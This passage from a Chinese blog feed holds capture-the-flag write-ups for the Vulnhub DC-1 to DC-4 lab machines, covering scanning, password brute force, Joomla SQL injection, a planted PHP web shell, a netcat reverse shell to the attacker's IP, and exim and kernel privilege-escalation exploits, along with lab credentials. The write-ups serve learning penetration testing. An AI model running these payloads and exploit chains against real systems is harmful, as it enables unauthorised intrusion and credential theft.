+<h5 id="内网信息探测">内网信息探测</h5>
+<pre><code class="language-shell">arp-scan -l  //通过mac地址得到靶机ip为 192.168.56.145
+nmap -A -p1-65535 -T4 192.168.56.145  //扫描开放端口
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230306192216993.png" alt="image-20230306192216993" loading="lazy"></figure>
+<p>上面的操作过后得到开放端口为22（ssh） 80（网页）</p>
+<p>浏览器访问 靶机地址</p>
+<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230306192601198.png" alt="image-20230306192601198" loading="lazy"></figure>
+<h5 id="账号密码暴破">账号密码暴破</h5>
+<p>一个登录口，使用插件得到中间件的类型和版本号。我本来是想通过中间件的nday去打的，但是找了一圈没发现什么合适的。于是直接用 burp弱口令暴破登录口了。其实我的字典最开始是没有爆出来的，（我这什么垃圾字典）通过网上的师傅的WP得到账号密码为 admin/happpy</p>
+<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230306192913525.png" alt="image-20230306192913525" loading="lazy"></figure>
+<h5 id="任意命令执行漏洞">任意命令执行漏洞</h5>
+<p>然后使用burp抓包操作，发现存在任意命令执行漏洞。</p>
+<figure data-type="image" tabindex="4"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230306193018259.png" alt="image-20230306193018259" loading="lazy"></figure>
+<figure data-type="image" tabindex="5"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230306193043959.png" alt="image-20230306193043959" loading="lazy"></figure>
+<figure data-type="image" tabindex="6"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230306193124575.png" alt="image-20230306193124575" loading="lazy"></figure>
+<p>发现可以得到这三个用户的密码。</p>
+<p>为什么确定这三个是用户呢？</p>
+<p>因为这三个路径和其他的都不一样，存在home路径。经验感觉这就是三个用户。</p>
+<p>兜兜转转执行下面这个命令得到jim下的密码文件。</p>
+<figure data-type="image" tabindex="7"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230306193507290.png" alt="image-20230306193507290" loading="lazy"></figure>
+<p>咋个发现的？</p>
+<p>网上wp copy的。这又不是实战，谁一个一个找啊。再说实战是这样玩的吗？</p>
+<h5 id="ssh连接">ssh连接</h5>
+<p>将上面得到的密码文件直接啊copy下来，然后放到kali中去。使用hydra暴破</p>
+<pre><code class="language-shell">hydra -l jim -P /root/3.txt ssh://192.168.56.145
+</code></pre>
+<figure data-type="image" tabindex="8"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230306194107764.png" alt="image-20230306194107764" loading="lazy"></figure>
+<p>得到账号密码为</p>
+<pre><code class="language-shell">jim/jibril04
+</code></pre>
+<figure data-type="image" tabindex="9"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230306194224590.png" alt="image-20230306194224590" loading="lazy"></figure>
+<p>成功连接。</p>
+<h5 id="权限提升">权限提升</h5>
+<p>目前还是普通用户的权限，无法得到flag，需要进行提取操作。前面的很多命令尝试后，无法正常执行。</p>
+<p>网上有些博客是通过这个账号下的一些信息，登录到其他的ssh账号，进行提权。那种我尝试了一下，发现得到的效果还是不太好。</p>
+<pre><code class="language-shell">find / -perm /4000  //查看可以使用的命令
+</code></pre>
+<figure data-type="image" tabindex="10"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230306194643715.png" alt="image-20230306194643715" loading="lazy"></figure>
+<p>发现exim 在特定的版本条件下 exim可以进行提权操作。查看exim的版本</p>
+<pre><code class="language-shell">/usr/sbin/exim4 --version
+</code></pre>
+<figure data-type="image" tabindex="11"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230306195007605.png" alt="image-20230306195007605" loading="lazy"></figure>
+<p>版本号为4.89</p>
+<p>searchsploit一下</p>
+<pre><code class="language-shell">searchsploit exim 
+</code></pre>
+<figure data-type="image" tabindex="12"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230306195308541.png" alt="image-20230306195308541" loading="lazy"></figure>
+<p>存在可提权漏洞。直接scp过去打就饿OK了</p>
+<pre><code class="language-shell">scp /usr/share/exploitdb/exploits/linux/local/46996.sh jim@192.168.56.145:/home/jim //输入下前面得到的密码就OK了
+</code></pre>
+<p>然后回到ssh连接终端，执行发送过去的文件。（需要注意的是，需要切换到根目录下。）</p>
+<pre><code class="language-shell">cd ~
+./46996.sh
+</code></pre>
+<figure data-type="image" tabindex="13"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230306195711100.png" alt="image-20230306195711100" loading="lazy"></figure>
+<p>成功提权并得到flag。</p>
+<h5 id="总结">总结</h5>
+<p>靶机总体的操作难度确实不高，但是又很多骚操作。比如在获取ssh密码的地方，如果你没有cat 那个路径，那么就无法找到。后面的操作也就无法执行了。还有就是 需要你了解过 Linux中的exim提权相关的知识。这两个是我认为这两个靶机比较重要的地方，其他地方思路还是差不多，kali找exp打。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[vulnhub DC-3 靶机]]></title>
+        <id>https://wghahaha.github.io/post/vulnhub-dc-3-ba-ji/</id>
+        <link href="https://wghahaha.github.io/post/vulnhub-dc-3-ba-ji/">
+        </link>
+        <updated>2023-03-06T03:56:54.000Z</updated>
+        <content type="html"><![CDATA[<p>本来说周末把这个靶机打完的，但是周末看了两天动画片。周一上午花了一上午上课的时间，把这个靶机再系统的复现了一下，（感谢我的老师对我的放水。）</p>
+<h4 id="dc-3靶机">DC-3靶机</h4>
+<p>过关方式:得到root权限，查看flag</p>
+<p>攻击机 ： kali           192.168.56.132</p>
+<p>受害机 ：DC-3          192.168.56.144</p>
+<h5 id="内网信息探测">内网信息探测</h5>
+<pre><code class="language-shell">arp-scan -l
+nmap -A -p1-65535 -T4 192.168.56.144
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230306102035660.png" alt="image-20230306102035660" loading="lazy"></figure>
+<p>根据DC-3靶机的mac地址确定靶机ip为 192.168.56.144。通过nmap的端口扫描得到开放端口为80.</p>
+<p>直接访问靶机ip</p>
+<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230306102254017.png" alt="image-20230306102254017" loading="lazy"></figure>
+<p>大概意思就是需要得到root权限。通过插件得到网站目录下有joomla的cms</p>
+<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230306102805676.png" alt="image-20230306102805676" loading="lazy"></figure>
+<p>但是我们现在还不知道该cms的路径。使用 joomscan扫描得到。</p>
+<figure data-type="image" tabindex="4"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230306103029856.png" alt="image-20230306103029856" loading="lazy"></figure>
+<p>扫到了joomla管理员的登录页面。</p>
+<figure data-type="image" tabindex="5"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230306103211075.png" alt="image-20230306103211075" loading="lazy"></figure>
+<h5 id="漏洞攻击">漏洞攻击</h5>
+<p>上面知道了该cms版本为 3.7.0.</p>
+<figure data-type="image" tabindex="6"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230306103418871.png" alt="image-20230306103418871" loading="lazy"></figure>
+<p>提示存在sql注入漏洞，查看利用文档</p>
+<figure data-type="image" tabindex="7"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230306103645378.png" alt="image-20230306103645378" loading="lazy"></figure>
+<p>提示了sqlmap一把嗦的方法。</p>
+<p>前面获取表名那些直接跳过，这里直接梭最后一步用户名和密码</p>
+<pre><code class="language-shell">sqlmap -u &quot;http://192.168.56.144/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D &quot;joomladb&quot; -T &quot;#__users&quot; -C &quot;id,username,password&quot; --dump -p list[fullordering]
+</code></pre>
+<figure data-type="image" tabindex="8"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230306110130210.png" alt="image-20230306110130210" loading="lazy"></figure>
+<p>密码是经过加密的，需要用到john进行密码暴破</p>
+<pre><code class="language-shell">vim 1.txt //将加密的内容写入文档中，并保存退出
+cat 1.txt //查看内容
+john 1.txt //分析
+</code></pre>
+<p>我第一次是可以成功的，第二把复现的就没办法成功。我也不知道这是为什么，大家可以下去研究下。密码暴破为 snoopy</p>
+<p>账号 admin</p>
+<p>密码 snoopy</p>
+<h5 id="get-webshell">get webshell</h5>
+<p>进入了后台我们下面就想get shell。查看是否可以 上传 web shell。</p>
+<figure data-type="image" tabindex="9"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230306111007747.png" alt="image-20230306111007747" loading="lazy"></figure>
+<p>选择第二个内容。</p>
+<figure data-type="image" tabindex="10"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230306111033216.png" alt="image-20230306111033216" loading="lazy"></figure>
+<p>点击第一个。</p>
+<figure data-type="image" tabindex="11"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230306111107237.png" alt="image-20230306111107237" loading="lazy"></figure>
+<p>通过这个入口写入一句话马。</p>
+<figure data-type="image" tabindex="12"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230306111140578.png" alt="image-20230306111140578" loading="lazy"></figure>
+<p>我们尝试访问下一句话马的路径。</p>
+<figure data-type="image" tabindex="13"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230306111253825.png" alt="image-20230306111253825" loading="lazy"></figure>
+<p>没有找到，说明我们的文件路径有问题。</p>
+<figure data-type="image" tabindex="14"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230306111329714.png" alt="image-20230306111329714" loading="lazy"></figure>
+<p>通过这段提示路径。</p>
+<pre><code class="language-shell">http://192.168.56.144/templates/beez3/html/shell.php
+</code></pre>
+<figure data-type="image" tabindex="15"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230306111435871.png" alt="zh" loading="lazy"></figure>
+<p>成功访问。然后进行蚁剑连接。</p>
+<figure data-type="image" tabindex="16"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230306111735853.png" alt="image-20230306111735853" loading="lazy"></figure>
+<p>这一步主要是为了后面上传exp。由于后续需要进行到提权操作。</p>
+<h5 id="反弹shell">反弹shell</h5>
+<p>现在回到刚才写一句话马的界面，写入反弹shell</p>
+<pre><code class="language-php">&lt;?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.56.132 1234 &gt;/tmp/f');?&gt;
+</code></pre>
+<p>然后监听端口</p>
+<pre><code class="language-shell">nc -lvnp 1234
+</code></pre>
+<p>访问一下写入反弹shell的目录里。</p>
+<figure data-type="image" tabindex="17"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230306112527347.png" alt="image-20230306112527347" loading="lazy"></figure>
+<p>由于不是完整的shell环境，我们还需要通过DC -提过的python的pty模块，得到完整的shell环境。</p>
+<pre><code class="language-shell">python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'
+</code></pre>
+<figure data-type="image" tabindex="18"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230306112817805.png" alt="image-20230306112817805" loading="lazy"></figure>
+<p>成功获取shell</p>
+<h5 id="权限提升">权限提升</h5>
+<p>查看权限。 whoami</p>
+<figure data-type="image" tabindex="19"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230306112902712.png" alt="image-20230306112902712" loading="lazy"></figure>
+<p>需要进行提权。</p>
+<p>执行前面两个操作过的东西，发现很多环境无法进行正常利用。</p>
+<p>查看 linux内核版本吗，尝试进行内核提权。</p>
+<figure data-type="image" tabindex="20"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230306113108756.png" alt="image-20230306113108756" loading="lazy"></figure>
+<p>得到linux的内核版本，然后查看是否有可利用的文件。</p>
+<figure data-type="image" tabindex="21"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230306113202511.png" alt="image-20230306113202511" loading="lazy"></figure>
+<p>查看利用内容。</p>
+<pre><code class="language-shell">cat /usr/share/exploitdb/exploits/linux/local/39772.txt
+</code></pre>
+<figure data-type="image" tabindex="22"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230306113521593.png" alt="image-20230306113521593" loading="lazy"></figure>
+<p>这一段是exp的下载地址。</p>
+<p>网上很多博客，我感觉他自己都没有去找过这个文件，他直接给你说这一段是exp的地址，叫你去下载，但是现在都2023年了，这个文件早就不能用了关于这个项目，也搬到gitlab上去了。那些还在说这个路径的，我也不知道他后续是如何进行提权的。</p>
+<pre><code class="language-shell">https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip
+</code></pre>
+<p>这才是现在的2023年3月6日可以找到的exp地址。</p>
+<p>下载下来后将文件复制到kali并通过蚁剑上传。</p>
+<pre><code class="language-shell">//进入exps上传的目录进行解压操作。
+unzip 39772.zip   //解压压缩包
+cd 39772    //切换到解压好的目录下
+tar -xvf exploit.tar  //解压提权压缩包
+cd ebpf_mapfd_doubleput_exploit //切换目录
+</code></pre>
+<pre><code class="language-shell">//切换到上面最后一步的目录后，再执行提权操作
+./compile.sh
+ls
+./doubleput //执行提权文件
+</code></pre>
+<pre><code class="language-shell">whoami
+</code></pre>
+<figure data-type="image" tabindex="23"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230306114505927.png" alt="image-20230306114505927" loading="lazy"></figure>
+<p>成功提权到root权限。</p>
+<pre><code class="language-shell">//获取flag
+cd/root
+ls
+cat the-flag.txt
+</code></pre>
+<figure data-type="image" tabindex="24"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230306114643798.png" alt="image-20230306114643798" loading="lazy"></figure>
+<p>成功拿到flag。</p>
+<h5 id="总结">总结</h5>
+<p>这个靶机的过关方式首先与前面两关的就不同，这个只需要得到一个flag就可以了。难度的话，我个人感觉是更低的。由于靶机只开放了一个80端口，所以没办法进行ssh连接操作，想执行shell。需要进行反弹shell的操作，提权的话用到的就是网上公开的exp，kali里面的文件路径已经过期了，需要到gitlab去找。这个靶机的难点我个人认为在于反弹shell的编写，我以前也没有系统学过，用的也是网上博客的。哪天还是去系统了解下。还有就是对于john这款工具，有些师傅没有用过，所以面对加密的密码就有点懵逼。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[vulnhub DC-2靶机]]></title>
+        <id>https://wghahaha.github.io/post/vulnhub-dc-2-ba-ji/</id>
+        <link href="https://wghahaha.github.io/post/vulnhub-dc-2-ba-ji/">
+        </link>
+        <updated>2023-03-02T10:34:11.000Z</updated>
+        <content type="html"><![CDATA[<h4 id="dc-2">DC-2</h4>
+<p>过关条件：和DC-1一样需要找到5个flag。</p>
+<p>攻击机：kali           192.168.56.132</p>
+<p>靶机    ：DC-2        192.168.56.141</p>
+<h5 id="内网信息探测">内网信息探测</h5>
+<p>还是一样使用扫描器确定一下靶机的IP和开放端口的情况。</p>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230302171501994.png" alt="image-20230302171501994" loading="lazy"></figure>
+<pre><code class="language-shell">通过mac地址确定IP地址为192.168.56.141
+靶机开放的端口为80（web网页） 和 7744（ssh）
+</code></pre>
+<p>我们访问一下靶机的web页面。</p>
+<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230302171928514.png" alt="image-20230302171928514" loading="lazy"></figure>
+<h5 id="hosts绕过">hosts绕过</h5>
+<pre><code class="language-shell">返回301，页面做了一个永久的重定向。无法访问web页面。尝试通过修改本地的hosts文件达到访问的目的
+</code></pre>
+<pre><code class="language-shell">sudo vim /etc/hosts
+192.168.56.141    dc-2
+</code></pre>
+<p>修改hosts文件后可以正常访问且访问后可以看到flag1。同时我们发现这是一款基于wordpress搭建网站，猜测后续会使用到wpscan</p>
+<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230302172239387.png" alt="image-20230302172239387" loading="lazy"></figure>
+<pre><code class="language-shelll">得到flag1 得到一大串英文看不懂，丢给谷歌翻译了。
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230302172425678.png" alt="image-20230302172425678" loading="lazy"></figure>
+<p>需要cewl？https://www.freebuf.com/articles/network/190128.html</p>
+<h5 id="暴破登录">暴破登录</h5>
+<p>尝试通过cewl生成一个密码字典。</p>
+<pre><code class="language-shell">cewl http://dc-2/ &gt;password.txt
+cat password.txt
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230302172917270.png" alt="image-20230302172917270" loading="lazy"></figure>
+<p>只有密码但是没有用户名就无法正常登录，通过wpscan进行用户名枚举(很多src这种洞据说也是收的)</p>
+<figure data-type="image" tabindex="6"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230302174248625.png" alt="image-20230302174248625" loading="lazy"></figure>
+<pre><code class="language-shell">得到三个用户名 admin jerry tom
+</code></pre>
+<p>使用vim 将这三个用户名写入一个新的字典当中。并将生成的密码字典与用户名字典联合进行遍历操作。</p>
+<pre><code class="language-shell">wpscan --url http://dc-2/ -U username.txt -P password.txt
+</code></pre>
+<figure data-type="image" tabindex="7"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230302174737297.png" alt="image-20230302174737297" loading="lazy"></figure>
+<pre><code class="language-shell">得到两组账号密码
+jerry     adipiscing
+tom       parturient
+</code></pre>
+<p>登录word press后台。通过信息收集得到 后台地址为 /wp-admin</p>
+<p>用jerry账号登录后到处点一点得到flag2，</p>
+<figure data-type="image" tabindex="8"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230302175147416.png" alt="image-20230302175147416" loading="lazy"></figure>
+<p>丢给谷歌翻译</p>
+<figure data-type="image" tabindex="9"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230302175305253.png" alt="image-20230302175305253" loading="lazy"></figure>
+<p>另外一个切入点？？？尝试登录了tom账号发现并不能得到什么有用的信息。</p>
+<p>我们最开始扫描端口的时候就找到了两个端口 分别是 80和7744</p>
+<h5 id="ssh连接">SSH连接</h5>
+<p>另外一个切入点就是从7744入手了，刚好77444是ssh连接的端口。我们就进行ssh连接操作。需要注意的是ssh连接默认的是22号端口，但是这里22号端口并没有开放，我们需要在后面加上 -p 7744</p>
+<figure data-type="image" tabindex="10"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230302175852076.png" alt="image-20230302175852076" loading="lazy"></figure>
+<pre><code class="language-shell">尝试对两个账号都进行了连接，jerry无法进行正常登录 tom账号可以登陆。
+</code></pre>
+<figure data-type="image" tabindex="11"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230302180200669.png" alt="image-20230302180200669" loading="lazy"></figure>
+<p>登录进去以后查看下当前目录下有什么文件，发现flag3.txt但是通过cat 命令无法查看，尝试使用vi查看。</p>
+<figure data-type="image" tabindex="12"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230302180215807.png" alt="image-20230302180215807" loading="lazy"></figure>
+<figure data-type="image" tabindex="13"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230302180316477.png" alt="image-20230302180316477" loading="lazy"></figure>
+<h5 id="内网横向移动">内网横向移动</h5>
+<p>这翻译看的我一脸懵逼，提到了jerry感觉可能是需要切换到jerry账号下。进行横向移动操作。</p>
+<p>su 命令无法正常使用所以我们需要绕过rbash（受限的bash）</p>
+<figure data-type="image" tabindex="14"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230302181013381.png" alt="image-20230302181013381" loading="lazy"></figure>
+<p>通过上面命令成功横向移动到jerry机器。找了一圈需要切换到根目录下才可以看到flag，</p>
+<pre><code class="language-shell">cd ~
+</code></pre>
+<figure data-type="image" tabindex="15"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230302181244965.png" alt="image-20230302181244965" loading="lazy"></figure>
+<p>提示还要进行深度操作，大概率就是进行提权为root了。</p>
+<h5 id="权限提升">权限提升</h5>
+<figure data-type="image" tabindex="16"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230302181801103.png" alt="image-20230302181801103" loading="lazy"></figure>
+<pre><code class="language-shell">直接 sudo -l 发现有个git提示nopassword满足git提权的条件。于是就进行git提权，网上找的方法。很简单两端命令就OK了
+</code></pre>
+<figure data-type="image" tabindex="17"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230302181920406.png" alt="image-20230302181920406" loading="lazy"></figure>
+<p>我两个方法都尝试了一下，第一次第二种是可以的，不知道为什么第二次复现的时候就要报错了</p>
+<p>使用第一种方法 成功提权</p>
+<figure data-type="image" tabindex="18"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230302182333048.png" alt="image-20230302182333048" loading="lazy"></figure>
+<h5 id="总结">总结</h5>
+<p>当我们通过扫描发现对方80端口是打开的后，但是却无法正常访问后，可以尝试修改本地的hosts文件达到绕过的目的。还有就是需要注意网站采用的是什么cms搭建的，以及ssh连接也不是只可以在22端口才可以开放。然后就是发现正常的命令没办法用了以后尝试切换到其他可以达到相同效果的命令。横向移动的方法也要注意，提权还是要首先执行 sudo -l看下有没有什么可以直接提权的命令。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[vulnhub DC-1靶机]]></title>
+        <id>https://wghahaha.github.io/post/vulnhub-dc-1-ba-ji/</id>
+        <link href="https://wghahaha.github.io/post/vulnhub-dc-1-ba-ji/">
+        </link>
+        <updated>2023-03-02T02:29:53.000Z</updated>
+        <content type="html"><![CDATA[<h4 id="dc-1靶机">DC-1靶机</h4>
+<p>过关条件:需要通过入侵DC-1靶机，得到5个flag。</p>
+<p>攻击机:kali</p>
+<p>靶机:DC 1</p>
+<h5 id="内网信息探测">内网信息探测</h5>
+<p>首先我们需要得到靶机的IP地址，在这之前我们需要将 kali 和 靶机的网卡都设置为NAT模式。</p>
+<pre><code class="language-shell">arp-scan -l 
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230302092230483.png" alt="image-20230302092230483" loading="lazy"></figure>
+<p>扫到了多个IP地址如何确定靶机的ip呢？</p>
+<p>这里我为了简单快速，我直接去查看了靶机的mac地址，进而确定了靶机的ip</p>
+<pre><code class="language-shell">192.168.56.140
+</code></pre>
+<p>使用nmap进行扫描端口操作</p>
+<pre><code class="language-shell">nmap -A -p1-65535 -T4 192.168.56.140
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230302093449933.png" alt="image-20230302093449933" loading="lazy"></figure>
+<pre><code class="language-shell">通过nmap扫描发现开放端口为 22 80 111 44377
+</code></pre>
+<p>可通过80端口访问网页 22端口进行SSH连接。</p>
+<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230302093513782.png" alt="image-20230302093513782" loading="lazy"></figure>
+<pre><code class="language-shell">发现搭建的cms为 Drupal 通过进一步收集得到版本为 7.x
+</code></pre>
+<h5 id="内网攻击">内网攻击</h5>
+<pre><code class="language-shell">去metasploit看下有没有nday可以打的
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230302094028538.png" alt="image-20230302094028538" loading="lazy"></figure>
+<p>直接使用exp</p>
+<figure data-type="image" tabindex="5"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230302094219715.png" alt="image-20230302094219715" loading="lazy"></figure>
+<pre><code class="language-shell">首先需要进行info查看配置信息，发现RHOSTS的地方没有内容，我们需要手动设置为靶机的IP
+set RHOSTS 192.168.56.140
+然后执行run或者exploit都可以。
+exp执行成功后输入shell 进入shell执行界面，但是得到的不是一个完整的shell环境，我们需要用过python的pty模块进行反弹完整的shell
+python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'
+</code></pre>
+<figure data-type="image" tabindex="6"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230302094912306.png" alt="image-20230302094912306" loading="lazy"></figure>
+<pre><code class="language-shell">现在我们就相当于进入了网站的根目录下面了，现在我们需要做的是找到flag。
+</code></pre>
+<figure data-type="image" tabindex="7"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230302095108128.png" alt="image-20230302095108128" loading="lazy"></figure>
+<pre><code class="language-shell">首先ls一下看目录下有什么文件 发现 flag1.txt文件
+直接cat flag1.txt
+得到flag1                       Every good CMS needs a config file - and so do you.
+
+通过翻译软件得到上面的中文意思为 每个好的 CMS 都需要一个配置文件——您也一样
+</code></pre>
+<p>提示我们需要到设置文件下找到下一个flag。</p>
+<figure data-type="image" tabindex="8"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230302095655160.png" alt="image-20230302095655160" loading="lazy"></figure>
+<pre><code class="language-shell">得到flag 2                        Brute force and dictionary attacks aren't the
+                                 only ways to gain access (and you WILL need access).
+                                 What can you do with these credentials?
+就是说我们需要得到访问权限。
+</code></pre>
+<figure data-type="image" tabindex="9"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230302095907246.png" alt="image-20230302095907246" loading="lazy"></figure>
+<pre><code class="language-shell">这段是数据库的一些内容猜测下一个flag的获取于数据库有关。
+</code></pre>
+<figure data-type="image" tabindex="10"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230302100218387.png" alt="image-20230302100218387" loading="lazy"></figure>
+<pre><code class="language-shell">根据前一段的提示猜测是进入 deupaldb数据库
+show tables; //查看下有哪些表
+</code></pre>
+<figure data-type="image" tabindex="11"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230302100449449.png" alt="image-20230302100449449" loading="lazy"></figure>
+<pre><code class="language-shell">用户的密码存在users表里面。
+</code></pre>
+<figure data-type="image" tabindex="12"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230302100601777.png" alt="image-20230302100601777" loading="lazy"></figure>
+<pre><code class="language-shell">发现是加盐密码，但是一般加盐的密码是很难破解的，所以选择修改用户密码来解决。首先生成自定密码的加盐哈希值。回到网站的目录下执行php scripts/password-hash.sh 密码命令生成。
+$S$DvoxOGg83NlqLw.PSRMYaRVxsvbCeZa6MgfentndPzsV3qDPZ2y7
+</code></pre>
+<figure data-type="image" tabindex="13"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230302101249779.png" alt="image-20230302101249779" loading="lazy"></figure>
+<figure data-type="image" tabindex="14"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230302101332999.png" alt="image-20230302101332999" loading="lazy"></figure>
+<pre><code class="language-shell">查询数据库文件发现已经成功修改了。
+</code></pre>
+<p>进入web页面输入我们能重新设置的账号和密码</p>
+<p>admin 666</p>
+<figure data-type="image" tabindex="15"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230302101453072.png" alt="image-20230302101453072" loading="lazy"></figure>
+<p>成功进入。在content里面找到flag3</p>
+<figure data-type="image" tabindex="16"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230302101631910.png" alt="image-20230302101631910" loading="lazy"></figure>
+<pre><code class="language-shell">Special PERMS will help FIND the passwd - but you'll need to -exec that command to work out how to get what's in the shadow.
+</code></pre>
+<figure data-type="image" tabindex="17"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230302101815061.png" alt="image-20230302101815061" loading="lazy"></figure>
+<h5 id="权限提升">权限提升</h5>
+<pre><code class="language-shell">通过前前面的提示cat/etc/passwd/
+发现了flag4但是当我们想深度利用的话，发现没有权限。
+我们通过kali的暴破神器 hydra暴破ssh的密码 暴破出来为orage。
+</code></pre>
+<figure data-type="image" tabindex="18"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230302102127675.png" alt="image-20230302102127675" loading="lazy"></figure>
+<pre><code class="language-shell">通过上面的方法成功ssh成功连接。
+探测权限。 whoami 为普通用户。
+</code></pre>
+<figure data-type="image" tabindex="19"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230302102356517.png" alt="image-20230302102356517" loading="lazy"></figure>
+<p>成功提权。</p>
+<figure data-type="image" tabindex="20"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230302102657787.png" alt="image-20230302102657787" loading="lazy"></figure>
+<pre><code class="language-shell">成功找到剩下的两个flag。
+</code></pre>
+<h5 id="思路总结">思路总结</h5>
+<p>首先我们通过扫描器确定了靶机的IP地址和开放端口，通过开放端口思考可以进行哪些工作。发现开放了80端口，于是想到访问web页面，然后通过信息收集确定了使用的cms和版本号。然后就用msf上的exp直接打，中间为了实现完整的shell环境需要使用到python的pty模块。进入shell环境后就开始找flag （第一个flag比较好找，剩下的flag需要根据上一个flag的提示寻找。）中间涉及到的一些问题就是关于数据库中的密码加盐加密，无法准确的解密，通过自己对密码设定加盐加密然后更新密码。得到新的账号和密码。然后就是通过暴力破解得到ssh的连接密码，但是这个密码是普通用户权限，需要进行权限提升。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[基于Golang学习并发编程]]></title>
+        <id>https://wghahaha.github.io/post/ji-yu-golang-xue-xi-bing-fa-bian-cheng/</id>
+        <link href="https://wghahaha.github.io/post/ji-yu-golang-xue-xi-bing-fa-bian-cheng/">
+        </link>
+        <updated>2023-02-28T02:10:22.000Z</updated>
